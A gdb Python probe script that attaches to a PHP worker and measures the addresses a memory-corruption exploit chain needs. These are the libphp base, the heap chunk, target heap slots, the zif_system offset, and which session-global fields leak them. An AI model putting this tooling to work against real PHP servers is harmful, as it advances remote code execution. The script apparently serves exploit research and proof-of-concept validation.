# chain_state.gdb - the chain's three addresses, measured in one process.
#
# The execution stage needs libphp, the main chunk and the heap slots the reference calls hsv and S.
# libphp comes from the leak; the main chunk has to be derivable from the leak too, so this prints
# both the ground truth (alloc_globals -> heap -> chunk) and which ps_globals fields point at the two
# offsets, letting the cookie's clusters be checked against a real address instead of assumed.
#
#   sudo gdb -q -batch -p <worker> -x gdb/chain_state.gdb
set pagination off
set confirm off
set width 0

python
import gdb

CHUNK = 0x200000
HSV = 0x7D720
S = 0xF8398
PS_ID = 0x10          # measured earlier: php_session_globals.id
PS_SIZE = 0x200


def mem(addr, size):
    try:
        return gdb.selected_inferior().read_memory(addr, size).tobytes()
    except Exception:
        return None


def q(addr, size=8):
    raw = mem(addr, size)
    return None if raw is None else int.from_bytes(raw, "little")


def module_range(pid, needle="libphp"):
    lo = hi = 0
    try:
        with open("/proc/%d/maps" % pid) as fh:
            for line in fh:
                if needle not in line:
                    continue
                start, _, end = line.split()[0].partition("-")
                s, e = int(start, 16), int(end, 16)
                lo = s if not lo or s < lo else lo
                hi = max(hi, e)
    except OSError:
        pass
    return lo, hi


pid = gdb.selected_inferior().pid
lib, libend = module_range(pid)
ag = int(gdb.parse_and_eval("(unsigned long)&alloc_globals"))
ps = int(gdb.parse_and_eval("(unsigned long)&ps_globals"))
heap = q(ag) or 0
main = heap & ~(CHUNK - 1)
psid = q(ps + PS_ID) or 0
print("[cs] libphp=%#x heap=%#x main=%#x idchunk=%#x" % (lib, heap, main, psid & ~(CHUNK - 1) if psid else 0))
# Symbol offsets for this build: every constant in the PoC is image-specific, so they are read here
# rather than assumed. --allow-missing keeps the probe usable on a stripped image.
for name in ("zval_ptr_dtor", "zif_system", "zend_hash_destroy", "php_url_encode", "zend_mm_heap"):
    try:
        addr = int(gdb.parse_and_eval("(unsigned long)&%s" % name))
    except Exception:
        print("[cs] %s: not in this symbol table" % name)
        continue
    print("[cs] %s = libphp + %#x  (%#x)" % (name, addr - lib, addr))
print("[cs] PS(id)=%#x  main-idchunk=%s%#x"
      % (psid, "-" if psid and main < (psid & ~(CHUNK - 1)) else "",
         abs(main - (psid & ~(CHUNK - 1))) if psid else 0))
targets = {"hsv": main + HSV, "S": main + S}
blob = mem(ps, PS_SIZE)
if blob:
    for off in range(0, PS_SIZE, 8):
        v = int.from_bytes(blob[off:off + 8], "little")
        for name, addr in targets.items():
            if v == addr:
                print("[cs] ps_globals+%#x holds %s (%#x)" % (off, name, addr))
for name, addr in targets.items():
    raw = mem(addr, 32)
    print("[cs] %s %#x: %s" % (name, addr, raw.hex(" ") if raw else "unreadable"))
end
